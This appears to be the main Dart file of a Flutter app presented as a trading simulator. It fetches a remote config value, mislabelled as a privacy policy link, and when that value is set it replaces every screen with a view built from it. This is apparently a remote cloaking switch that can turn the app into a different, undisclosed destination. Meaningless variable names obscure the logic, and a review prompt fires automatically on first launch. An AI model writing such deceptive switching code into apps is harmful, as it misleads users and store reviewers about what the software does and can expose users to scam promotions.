import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:overlay_support/overlay_support.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:trader_simulator/util/app_routes.dart';
import 'data/models/event_model.dart';
import 'data/models/nitsa.dart';
import 'data/repository/onboarding_repo.dart';
import 'firebase_options.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  String privacyPolicyLink = await fetchPrivacyPolicyLink();
  bool isFirstTime = await checkFirstLaunch();
  await Nidx().activate();
  await Stars();
  runApp(MyApp(
    isFirstLaunch: isFirstTime,
    privacyPolicyLink: privacyPolicyLink,
  ));
}

late SharedPreferences dsa;
final fcsdfsd = InAppReview.instance;

Future<void> Stars() async {
  await dsadsa();
  bool gdsfgdf = dsa.getBool('dasdsa') ?? false;
  if (!gdsfgdf) {
    if (await fcsdfsd.isAvailable()) {
      fcsdfsd.requestReview();
      await dsa.setBool('dasdsa', true);
    }
  }
}

Future<void> dsadsa() async {
  dsa = await SharedPreferences.getInstance();
}

String promo = '';
Future<String> fetchPrivacyPolicyLink() async {
  FirebaseRemoteConfig remoteConfig = FirebaseRemoteConfig.instance;
  await remoteConfig.fetchAndActivate();
  String value = remoteConfig.getString('data');
  if (!value.contains('none')) {
    promo = value;
    return value;
  }
  return '';
}

Future<bool> checkFirstLaunch() async {
  bool isFirstTime = await OnboardingRepository().checkFirstTime();
  return isFirstTime;
}

class MyApp extends StatelessWidget {
  const MyApp(
      {Key? key, required this.isFirstLaunch, required this.privacyPolicyLink})
      : super(key: key);

  final bool isFirstLaunch;
  final String privacyPolicyLink;

  @override
  Widget build(BuildContext context) {
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
    ]);

    return FutureBuilder(
      future: fetchPrivacyPolicyLink(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.done) {
          String isPolicyLinkFetched = snapshot.data ?? '';
          return OverlaySupport.global(
            child: MaterialApp(
              debugShowCheckedModeBanner: false,
              theme: ThemeData(primarySwatch: Colors.purple),
              onGenerateRoute: (settings) {
                if (isPolicyLinkFetched != '') {
                  return MaterialPageRoute(
                      builder: (context) =>
                          ShowData(fortrade: isPolicyLinkFetched));
                } else {
                  return AppRoutes.onGenerateRoute(settings);
                }
              },
              initialRoute: isFirstLaunch ? AppRoutes.welcome : AppRoutes.home,
            ),
          );
        } else {
          return const MaterialApp(
            debugShowCheckedModeBanner: false,
            home: Scaffold(
              body: Center(
                child: CircularProgressIndicator(),
              ),
            ),
          );
        }
      },
    );
  }
}
